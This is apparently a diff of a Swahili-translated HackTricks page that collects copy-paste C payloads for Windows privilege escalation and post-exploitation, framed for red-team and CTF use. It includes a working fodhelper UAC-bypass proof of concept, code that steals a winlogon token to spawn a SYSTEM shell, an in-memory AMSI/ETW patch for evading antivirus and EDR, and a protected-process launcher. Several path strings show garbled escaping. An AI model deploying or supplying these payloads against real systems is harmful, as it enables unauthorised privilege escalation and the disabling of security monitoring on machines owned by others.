@@ -1,10 +1,10 @@
-# Windows C Payloads
+# Malipo za C za Windows
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Ukurasa huu unakusanya **vipande vidogo vya C vilivyojitegemea** ambavyo ni vya manufaa wakati wa Windows Local Privilege Escalation au post-exploitation. Kila payload imeundwa kuwa **rafiki kwa nakala na bandika**, inahitaji tu Windows API / C runtime, na inaweza kukusanywa kwa `i686-w64-mingw32-gcc` (x86) au `x86_64-w64-mingw32-gcc` (x64).
+Ukurasa huu unakusanya **vipande vidogo vya C vilivyojitegemea** vinavyokuwa vya manufaa wakati wa Windows Local Privilege Escalation au post-exploitation. Kila payload imeundwa kuwa **rafiki kwa kunakili-na-kubandika**, inahitaji tu Windows API / C runtime, na inaweza kukusanywa kwa `i686-w64-mingw32-gcc` (x86) au `x86_64-w64-mingw32-gcc` (x64).
 
-> ⚠️  Hizi payload zinadhani kwamba mchakato tayari una ruhusa za chini zinazohitajika kutekeleza kitendo (mfano `SeDebugPrivilege`, `SeImpersonatePrivilege`, au muktadha wa kati wa uaminifu kwa UAC bypass). Zimekusudiwa kwa **red-team au mazingira ya CTF** ambapo kutumia udhaifu kumepata utekelezaji wa msimbo wa asili usio na mipaka.
+> ⚠️  Payload hizi zinadhani kuwa mchakato tayari una vigezo vya chini vinavyohitajika kutekeleza kitendo (mfano `SeDebugPrivilege`, `SeImpersonatePrivilege`, au medium-integrity context kwa ajili ya UAC bypass). Zimetengenezwa kwa ajili ya **red-team au CTF** ambapo kutumia udhaifu kumesababisha arbitrary native code execution.
 
 ---
 
@@ -21,13 +21,13 @@ return 0;
 ---
 
 ## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
-Wakati faili la kuaminika **`fodhelper.exe`** linatekelezwa, linauliza njia ya rejista hapa chini **bila kuchuja neno la `DelegateExecute`**. Kwa kupanda amri yetu chini ya ufunguo huo, mshambuliaji anaweza kupita UAC *bila* kuweka faili kwenye diski.
+Wakati binary iliyoaminika **`fodhelper.exe`** inapoendeshwa, inatafuta njia ya registry hapa chini **bila kuchuja kitenzi `DelegateExecute`**. Kwa kuweka amri yetu chini ya ufunguo huo, mshambulizi anaweza bypass UAC *bila* kuacha faili kwenye diski.
 
-*Registry path queried by `fodhelper.exe`*
+*Njia ya registry inayotafutwa na `fodhelper.exe`*
 ```
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
-PoC ndogo inayofungua `cmd.exe` iliyo na haki za juu:
+PoC ndogo inayofungua `cmd.exe` iliyoinuliwa:
 ```c
 // x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
 #define _CRT_SECURE_NO_WARNINGS
@@ -61,12 +61,12 @@ system("fodhelper.exe");
 return 0;
 }
 ```
-*Imepimwa kwenye Windows 10 22H2 na Windows 11 23H2 (pachiko za Julai 2025). Njia ya kukwepa bado inafanya kazi kwa sababu Microsoft haijarekebisha ukosefu wa ukaguzi wa uaminifu katika njia ya `DelegateExecute`.*
+*Imethibitishwa kwenye Windows 10 22H2 na Windows 11 23H2 (patches za Julai 2025). Bypass bado inafanya kazi kwa sababu Microsoft haijarekebisha ukaguzi wa uadilifu uliokosekana katika njia ya `DelegateExecute`.*
 
 ---
 
-## Kuanzisha shell ya SYSTEM kupitia nakala ya tokeni (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
-Ikiwa mchakato wa sasa unashikilia **zote** `SeDebug` na `SeImpersonate` ruhusa (ya kawaida kwa akaunti nyingi za huduma), unaweza kuiba tokeni kutoka `winlogon.exe`, kuiga, na kuanzisha mchakato wa juu:
+## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
+Ikiwa mchakato wa sasa una **zote mbili** ruhusa za `SeDebug` na `SeImpersonate` (kawaida kwa akaunti za huduma nyingi), unaweza kuiba token kutoka kwa `winlogon.exe`, kuiiga (duplicate), na kuanzisha mchakato wenye ruhusa za juu:
 ```c
 // x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
 #include <windows.h>
@@ -102,7 +102,7 @@ DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPri
 STARTUPINFOW si = { .cb = sizeof(si) };
 PROCESS_INFORMATION pi = { 0 };
 if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
-L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
+L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
 NULL, NULL, &si, &pi)) {
 CloseHandle(pi.hProcess);
 CloseHandle(pi.hThread);
@@ -122,8 +122,8 @@ sedebug-+-seimpersonate-copy-token.md
 
 ---
 
-## Patching ya AMSI & ETW Katika Kumbukumbu (Kuepuka Ulinzi)
-Mifumo mingi ya kisasa ya AV/EDR inategemea **AMSI** na **ETW** kuchunguza tabia mbaya. Kuweka patch kwenye interfaces zote mbili mapema ndani ya mchakato wa sasa kunazuia payloads za msingi wa script (k.m. PowerShell, JScript) ziskenwe.
+## In-Memory AMSI & ETW Patch (Defence Evasion)
+Mifumo mingi ya kisasa ya AV/EDR hutegemea **AMSI** na **ETW** kuchunguza tabia zenye hatari. Kurekebisha interfaces zote mapema ndani ya mchakato wa sasa kunazuia payloads zinazotegemea script (mfano PowerShell, JScript) zisichunguzwe.
 ```c
 // gcc -o patch_amsi.exe patch_amsi.c -lntdll
 #define _CRT_SECURE_NO_WARNINGS
@@ -150,12 +150,56 @@ MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
 return 0;
 }
 ```
-*Patches hapo juu ni za mchakato wa ndani; kuanzisha PowerShell mpya baada ya kuikimbia kutatekelezwa bila ukaguzi wa AMSI/ETW.*
+*Patch iliyo hapo juu ni ya ndani ya mchakato (process-local); kuanzisha PowerShell mpya baada ya kuitekeleza kutaendelea bila ukaguzi wa AMSI/ETW.*
 
 ---
 
-## Marejeo
+## Unda mchakato mtoto kama Protected Process Light (PPL)
+Omba kiwango cha ulinzi cha PPL kwa mchakato mtoto wakati wa uundaji kwa kutumia `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Hii ni API iliyodokumentishwa na itafanikiwa tu ikiwa image lengwa imepewa saini kwa daraja la saini linaloombwa (Windows/WindowsLight/Antimalware/LSA/WinTcb).
+```c
+// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
+#include <windows.h>
+
+int wmain(void) {
+STARTUPINFOEXW si = {0};
+PROCESS_INFORMATION pi = {0};
+si.StartupInfo.cb = sizeof(si);
+
+SIZE_T attrSize = 0;
+InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
+InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
+
+DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
+UpdateProcThreadAttribute(si.lpAttributeList, 0,
+PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
+&lvl, sizeof(lvl), NULL, NULL);
+
+if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
+EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
+// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
+return 1;
+}
+DeleteProcThreadAttributeList(si.lpAttributeList);
+HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
+CloseHandle(pi.hThread);
+CloseHandle(pi.hProcess);
+return 0;
+}
+```
+Viwango vinavyotumika zaidi:
+- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
+- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
+- `PROTECTION_LEVEL_LSA_LIGHT` (4)
+
+Thibitisha matokeo kwa Process Explorer/Process Hacker kwa kuangalia safu ya Protection.
+
+---
+
+## Marejeleo
 * Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
 * SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
+* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
+* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
 
 {{#include ../../banners/hacktricks-training.md}}
